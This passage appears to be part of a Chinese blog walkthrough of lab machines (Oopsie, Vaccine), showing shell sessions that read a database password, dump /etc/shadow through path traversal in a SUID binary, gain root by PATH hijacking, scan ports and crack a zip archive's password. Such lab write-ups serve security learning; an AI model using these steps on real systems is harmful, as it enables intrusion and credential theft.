BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped<br><br></code></pre></td></tr></table></figure><p>是个可执行文件，尝试运行一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@oopsie:/$ /usr/bin/bugtracker<br>/usr/bin/bugtracker<br>bash: /usr/bin/bugtracker: Permission denied<br>www-data@oopsie:/$ <span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">cd</span> /tmp<br>www-data@oopsie:/tmp$ /usr/bin/bugtracker<br>/usr/bin/bugtracker<br>bash: /usr/bin/bugtracker: Permission denied<br></code></pre></td></tr></table></figure><p>没有权限执行……那就继续信息收集吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@oopsie:/var/www/html$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>cdn-cgi  css  fonts  images  index.php  js  themes  uploads<br></code></pre></td></tr></table></figure><p>有个 cdn-cgi 目录进去看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@oopsie:/var/www/html/cdn-cgi$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 12K<br>58427 drwxr-xr-x 3 root root 4.0K Jul 28  2021 .<br>58146 drwxr-xr-x 9 root root 4.0K Jul 28  2021 ..<br>58428 drwxr-xr-x 2 root root 4.0K Jul 28  2021 login<br>www-data@oopsie:/var/www/html/cdn-cgi$ <span class="hljs-built_in">cd</span> login<br><span class="hljs-built_in">cd</span> login<br>www-data@oopsie:/var/www/html/cdn-cgi/login$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 28K<br>58428 drwxr-xr-x 2 root root 4.0K Jul 28  2021 .<br>58427 drwxr-xr-x 3 root root 4.0K Jul 28  2021 ..<br>58430 -rw-r--r-- 1 root root 6.3K Apr 15  2021 admin.php<br>58432 -rw-r--r-- 1 root root   80 Jan 24  2020 db.php<br>58429 -rw-r--r-- 1 root root 5.3K Apr 15  2021 index.php<br>58431 -rw-r--r-- 1 root root    0 Jan 24  2020 script.js<br>www-data@oopsie:/var/www/html/cdn-cgi/login$ <span class="hljs-built_in">cat</span> db.php<br><span class="hljs-built_in">cat</span> db.php<br>&lt;?php<br><span class="hljs-variable">$conn</span> = mysqli_connect(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;robert&#x27;</span>,<span class="hljs-string">&#x27;M3g4C0rpUs3r!&#x27;</span>,<span class="hljs-string">&#x27;garage&#x27;</span>);<br>?&gt;<br></code></pre></td></tr></table></figure><h4 id="横向移动切换用户"><a href="#横向移动切换用户" class="headerlink" title="横向移动切换用户"></a>横向移动切换用户</h4><p>得到了数据库的用户名和密码，不过这个用户名似乎在 passwd 中也有，我们尝试使用 su 命令来切换用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@oopsie:/var/www/html/cdn-cgi/login$ su robert<br>su robert<br>Password: M3g4C0rpUs3r!<br><br>robert@oopsie:/var/www/html/cdn-cgi/login$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>robert<br>robert@oopsie:/var/www/html/cdn-cgi/login$ sudo -l<br>sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> robert: M3g4C0rpUs3r!<br><br>Sorry, user robert may not run sudo on oopsie.<br></code></pre></td></tr></table></figure><p>接下来我们就要回到之前那个没有权限运行文件中，看看这次是否能运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">robert@oopsie:/var/www/html/cdn-cgi/login$ <span class="hljs-built_in">cd</span> /usr/bin<br><span class="hljs-built_in">cd</span> /usr/bin<br>robert@oopsie:/usr/bin$ bugtracker<br>bugtracker<br><br>------------------<br>: EV Bug Tracker :<br>------------------<br><br>Provide Bug ID: 1<br>1<br>---------------<br><br>Binary package hint: ev-engine-lib<br><br>Version: 3.3.3-1<br><br>Reproduce:<br>When loading library <span class="hljs-keyword">in</span> firmware it seems to be crashed<br><br>What you expected to happen:<br>Synchronized browsing to be enabled since it is enabled <span class="hljs-keyword">for</span> that site.<br><br>What happened instead:<br>Synchronized browsing is disabled. Even choosing VIEW &gt; SYNCHRONIZED BROWSING from menu does not stay enabled between connects.<br></code></pre></td></tr></table></figure><p>感觉像是输入一个漏洞的 id，就会获得对应的描述</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">robert@oopsie:/usr/bin$ ^[[A<br>bugtracker<br><br>------------------<br>: EV Bug Tracker :<br>------------------<br><br>Provide Bug ID: 11<br>11<br>---------------<br><br><span class="hljs-built_in">cat</span>: /root/reports/11: No such file or directory<br><br></code></pre></td></tr></table></figure><p>这次尝试输入一个较大的数字，发现提示 cat 没有读取到对应的文件，这里可以尝试一下存不存在本地任意文件读取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs bash">robert@oopsie:/usr/bin$ ^[[A<br>./bugtracker<br><br>------------------<br>: EV Bug Tracker :<br>------------------<br><br>Provide Bug ID: ../../../etc/shadow<br>../../../etc/shadow<br>---------------<br><br>root:$6$eD0n5saZ<span class="hljs-variable">$orykpdd7mVL</span>/lF57rIGwUzeSROPC1KRITJ45Nqn6P2BLaZ.tcSOy5fNFcOw9uBRkClgu5R9WlyxpEId5qOOVY.:18285:0:99999:7:::<br>daemon:*:18113:0:99999:7:::<br>bin:*:18113:0:99999:7:::<br>sys:*:18113:0:99999:7:::<br><span class="hljs-built_in">sync</span>:*:18113:0:99999:7:::<br>games:*:18113:0:99999:7:::<br>man:*:18113:0:99999:7:::<br>lp:*:18113:0:99999:7:::<br>mail:*:18113:0:99999:7:::<br>news:*:18113:0:99999:7:::<br>uucp:*:18113:0:99999:7:::<br>proxy:*:18113:0:99999:7:::<br>www-data:*:18113:0:99999:7:::<br>backup:*:18113:0:99999:7:::<br>list:*:18113:0:99999:7:::<br>irc:*:18113:0:99999:7:::<br>gnats:*:18113:0:99999:7:::<br>nobody:*:18113:0:99999:7:::<br>systemd-network:*:18113:0:99999:7:::<br>systemd-resolve:*:18113:0:99999:7:::<br>syslog:*:18113:0:99999:7:::<br>messagebus:*:18113:0:99999:7:::<br>_apt:*:18113:0:99999:7:::<br>lxd:*:18113:0:99999:7:::<br>uuidd:*:18113:0:99999:7:::<br>dnsmasq:*:18113:0:99999:7:::<br>landscape:*:18113:0:99999:7:::<br>pollinate:*:18113:0:99999:7:::<br>sshd:*:18284:0:99999:7:::<br>robert:$6$kriHoPwv<span class="hljs-variable">$iBt45Fu0g4R0uNWSubfjDRvtUSwxVu</span>.U1JhYKmT4voMWlVc3/u2nu0j0JZL0YWmm62vRgAs4acBl8Ge.S393H/:18285:0:99999:7:::<br>mysql:!:18284:0:99999:7:::<br></code></pre></td></tr></table></figure><p>确实存在本地任意文件读取，不过这个密码爆破不出结果(，只能再考虑别的方法，借助于搜索引擎发现可以利用环境变量搞事情，思维局限了没考虑到这方面。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">robert@oopsie:/usr/bin$ <span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">cd</span> /tmp<br>robert@oopsie:/tmp$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash&quot;</span> &gt; <span class="hljs-built_in">cat</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash&quot;</span> &gt; <span class="hljs-built_in">cat</span><br>robert@oopsie:/tmp$ <span class="hljs-built_in">chmod</span> +x <span class="hljs-built_in">cat</span><br><span class="hljs-built_in">chmod</span> +x <span class="hljs-built_in">cat</span><br>robert@oopsie:/tmp$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 12K<br>131145 drwxrwxrwt  2 root   root   4.0K Jun  3 03:25 .<br>     2 drwxr-xr-x 24 root   root   4.0K Oct 11  2021 ..<br>131132 -rwxrwxr-x  1 robert robert   10 Jun  3 03:25 <span class="hljs-built_in">cat</span><br></code></pre></td></tr></table></figure><h4 id="环境变量提权"><a href="#环境变量提权" class="headerlink" title="环境变量提权"></a>环境变量提权</h4><ul><li>Navigate to the &#x2F;tmp folder.</li><li>Write the &#x2F;bin&#x2F;bash command to a new file named cat.</li><li>Give this newly created cat file executable permission with the chmod +x command.</li><li>To check the newly created cat file permissions, type ls -l and ensure the “x” flag.</li><li>To check the newly created cat file content, type cat .&#x2F;cat and ensure the content.</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs bash">robert@oopsie:/tmp$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games<br>robert@oopsie:/tmp$ <span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><br>robert@oopsie:/tmp$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games<br>robert@oopsie:/tmp$ <span class="hljs-built_in">which</span> <span class="hljs-built_in">cat</span><br><span class="hljs-built_in">which</span> <span class="hljs-built_in">cat</span><br>/tmp/cat<br>robert@oopsie:/tmp$ /usr/bin/bugtracker<br>/usr/bin/bugtracker<br><br>------------------<br>: EV Bug Tracker :<br>------------------<br><br>Provide Bug ID: 1<br>1<br>---------------<br><br>root@oopsie:/tmp<span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br>root@oopsie:/tmp<span class="hljs-comment"># id</span><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=1000(robert) <span class="hljs-built_in">groups</span>=1000(robert),1001(bugtracker)<br>root@oopsie:/tmp<span class="hljs-comment"># uname -a</span><br><span class="hljs-built_in">uname</span> -a<br>Linux oopsie 4.15.0-76-generic <span class="hljs-comment">#86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br>root@oopsie:/tmp<span class="hljs-comment"># sudo -l</span><br>sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> root on oopsie:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User root may run the following commands on oopsie:<br>    (ALL : ALL) ALL<br>root@oopsie:/tmp<span class="hljs-comment"># ip a</span><br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host<br>       valid_lft forever preferred_lft forever<br>2: ens160: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:50:56:b9:71:b9 brd ff:ff:ff:ff:ff:ff<br>    inet 10.129.95.191/16 brd 10.129.255.255 scope global ens160<br>       valid_lft forever preferred_lft forever<br>    inet6 dead:beef::250:56ff:feb9:71b9/64 scope global dynamic mngtmpaddr<br>       valid_lft 86398sec preferred_lft 14398sec<br>    inet6 fe80::250:56ff:feb9:71b9/64 scope <span class="hljs-built_in">link</span><br>       valid_lft forever preferred_lft forever<br>root@oopsie:/tmp<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h2 id="Vaccine"><a href="#Vaccine" class="headerlink" title="Vaccine"></a>Vaccine</h2><h3 id="信息收集-3"><a href="#信息收集-3" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 10.129.5.22<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-05 04:28 EDT<br>Warning: 10.129.5.22 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (10).<br>Nmap scan report <span class="hljs-keyword">for</span> 10.129.5.22<br>Host is up (0.031s latency).<br>Not shown: 64771 closed tcp ports (reset), 761 filtered tcp ports (no-response)<br>PORT   STATE SERVICE<br>21/tcp open  ftp<br>22/tcp open  ssh<br>80/tcp open  http<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 28.68 seconds<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nmap -sT -sV -sC -p21,22,80 10.129.5.22<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-05 04:29 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.129.5.22<br>Host is up (0.0045s latency).<br><br>PORT   STATE SERVICE VERSION<br>21/tcp open  ftp     vsftpd 3.0.3<br>| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br>|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip<br>| ftp-syst:<br>|   STAT:<br>| FTP server status:<br>|      Connected to ::ffff:10.10.14.109<br>|      Logged <span class="hljs-keyword">in</span> as ftpuser<br>|      TYPE: ASCII<br>|      No session bandwidth <span class="hljs-built_in">limit</span><br>|      Session <span class="hljs-built_in">timeout</span> <span class="hljs-keyword">in</span> seconds is 300<br>|      Control connection is plain text<br>|      Data connections will be plain text<br>|      At session startup, client count was 2<br>|      vsFTPd 3.0.3 - secure, fast, stable<br>|_End of status<br>22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   3072 c0ee58077534b00b9165b259569527a4 (RSA)<br>|   256 ac6e81188922d7a7417d814f1bb8b251 (ECDSA)<br>|_  256 425bc321dfefa20bc95e03421d69d028 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))<br>| http-cookie-flags:<br>|   /:<br>|     PHPSESSID:<br>|_      httponly flag not <span class="hljs-built_in">set</span><br>|_http-title: MegaCorp Login<br>|_http-server-header: Apache/2.4.41 (Ubuntu)<br>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 7.40 seconds<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nmap --script=vuln -p21,22,80 10.129.5.22<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-05 04:37 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.129.5.22<br>Host is up (0.0035s latency).<br><br>PORT   STATE SERVICE<br>21/tcp open  ftp<br>22/tcp open  ssh<br>80/tcp open  http<br>|_http-stored-xss: Couldn\<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</span><br><span class="hljs-string">|_http-dombased-xss: Couldn\&#x27;</span>t find any DOM based XSS.<br>| http-csrf:<br>| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.129.5.22<br>|   Found the following possible CSRF vulnerabilities:<br>|<br>|     Path: http://10.129.5.22:80/<br>|     Form <span class="hljs-built_in">id</span>: login__username<br>|_    Form action:<br>| http-cookie-flags:<br>|   /:<br>|     PHPSESSID:<br>|_      httponly flag not <span class="hljs-built_in">set</span><br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 32.32 seconds<br></code></pre></td></tr></table></figure><h3 id="ftp-匿名登录"><a href="#ftp-匿名登录" class="headerlink" title="ftp 匿名登录"></a>ftp 匿名登录</h3><p>试一试匿名登录 ftp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ ftp 10.129.5.22<br>Connected to 10.129.5.22.<br>220 (vsFTPd 3.0.3)<br>Name (10.129.5.22:i3eg1nner): anonymous<br>331 Please specify the password.<br>Password:<br>230 Login successful.<br>Remote system <span class="hljs-built_in">type</span> is UNIX.<br>Using binary mode to transfer files.<br>ftp&gt; <span class="hljs-built_in">ls</span><br>229 Entering Extended Passive Mode (|||10107|)<br>150 Here comes the directory listing.<br>-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip<br>226 Directory send OK.<br>ftp&gt; get backup.zip<br><span class="hljs-built_in">local</span>: backup.zip remote: backup.zip<br>229 Entering Extended Passive Mode (|||10016|)<br>150 Opening BINARY mode data connection <span class="hljs-keyword">for</span> backup.zip (2533 bytes).<br>100% |*****************************************************************************************************************************************************************|  2533        1.58 MiB/s    00:00 ETA<br>226 Transfer complete.<br>2533 bytes received <span class="hljs-keyword">in</span> 00:00 (429.74 KiB/s)<br><br></code></pre></td></tr></table></figure><p>登录成功，下载了一个文件 <code>backup.zip</code>，一般不建议直接解压文件，这里我们先使用 zip -l 来看看压缩包里是什么文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ unzip -l backup.zip<br>Archive:  backup.zip<br>  Length      Date    Time    Name<br>---------  ---------- -----   ----<br>     2594  2020-02-03 05:57   index.php<br>     3274  2020-02-03 14:04   style.css<br>---------                     -------<br>     5868                     2 files<br><br></code></pre></td></tr></table></figure><p>应该没风险，解压试试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ unzip backup.zip<br>Archive:  backup.zip<br>[backup.zip] index.php password:<br>   skipping: index.php               incorrect password<br>   skipping: style.css               incorrect password<br></code></pre></td></tr></table></figure><h3 id="John-爆破-zip-密码"><a href="#John-爆破-zip-密码" class="headerlink" title="John 爆破 zip 密码"></a>John 爆破 zip 密码</h3><p>需要密码（接下来考虑破解 zip 密码试试。首先我们要使用 zip2john 工具来将其进行转化，如何借助于 john 来爆破密码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ zip2john backup.zip &gt; hashes.txt<br>ver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06 ts=5722 cs=5722 <span class="hljs-built_in">type</span>=8<br>ver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A ts=989A cs=989a <span class="hljs-built_in">type</span>=8<br>NOTE: It is assumed that all files <span class="hljs-keyword">in</span> each archive have the same password.<br>If that is not the <span class="hljs-keyword">case</span>, the <span class="hljs-built_in">hash</span> may be uncrackable. To avoid this, use<br>option -o to pick a file at a time.<br><br>┌──(i3eg1nner㉿minilite)-[~]<br>└─$ <span class="hljs-built_in">cat</span> hashes.txt<br>backup.zip:$pkzip<span class="hljs-variable">$2</span>*1*1*0*8*24*5722*543fb39ed1a919ce7b58641a238e00f4cb3a826cfb1b8f4b225aa15c4ffda8fe72f60a82*2*0*3da*cca*1b1ccd6a*504*43*8*3da*989a*22290dc3505e51d341f31925a7ffefc181ef9f66d8d25e53c82afc7c1598fbc3fff28a17ba9d8cec9a52d66a11ac103f257e14885793fe01e26238915796640e8936073177d3e6e28915f5abf20fb2fb2354cf3b7744be3e7a0a9a798bd40b63dc00c2ceaef81beb5d3c2b94e588c58725a07fe4ef86c990872b652b3dae89b2fff1f127142c95a5c3452b997e3312db40aee19b120b85b90f8a8828a13dd114f3401142d4bb6b4e369e308cc81c26912c3d673dc23a15920764f108ed151ebc3648932f1e8befd9554b9c904f6e6f19cbded8e1cac4e48a5be2b250ddfe42f7261444fbed8f86d207578c61c45fb2f48d7984ef7dcf88ed3885aaa12b943be3682b7df461842e3566700298efad66607052bd59c0e861a7672356729e81dc326ef431c4f3a3cdaf784c15fa7eea73adf02d9272e5c35a5d934b859133082a9f0e74d31243e81b72b45ef3074c0b2a676f409ad5aad7efb32971e68adbbb4d34ed681ad638947f35f43bb33217f71cbb0ec9f876ea75c299800bd36ec81017a4938c86fc7dbe2d412ccf032a3dc98f53e22e066defeb32f00a6f91ce9119da438a327d0e6b990eec23ea820fa24d3ed2dc2a7a56e4b21f8599cc75d00a42f02c653f9168249747832500bfd5828eae19a68b84da170d2a55abeb8430d0d77e6469b89da8e0d49bb24dbfc88f27258be9cf0f7fd531a0e980b6defe1f725e55538128fe52d296b3119b7e4149da3716abac1acd841afcbf79474911196d8596f79862dea26f555c772bbd1d0601814cb0e5939ce6e4452182d23167a287c5a18464581baab1d5f7d5d58d8087b7d0ca8647481e2d4cb6bc2e63aa9bc8c5d4dfc51f9cd2a1ee12a6a44a6e64ac208365180c1fa02bf4f627d5ca5c817cc101ce689afe130e1e6682123635a6e524e2833335f3a44704de5300b8d196df50660bb4dbb7b5cb082ce78d79b4b38e8e738e26798d10502281bfed1a9bb6426bfc47ef62841079d41dbe4fd356f53afc211b04af58fe3978f0cf4b96a7a6fc7ded6e2fba800227b186ee598dbf0c14cbfa557056ca836d69e28262a060a201d005b3f2ce736caed814591e4ccde4e2ab6bdbd647b08e543b4b2a5b23bc17488464b2d0359602a45cc26e30cf166720c43d6b5a1fddcfd380a9c7240ea888638e12a4533cfee2c7040a2f293a888d6dcc0d77bf0a2270f765e5ad8bfcbb7e68762359e335dfd2a9563f1d1d9327eb39e68690a8740fc9748483ba64f1d923edfc2754fc020bbfae77d06e8c94fba2a02612c0787b60f0ee78d21a6305fb97ad04bb562db282c223667af8ad907466b88e7052072d6968acb7258fb8846da057b1448a2a9699ac0e5592e369fd6e87d6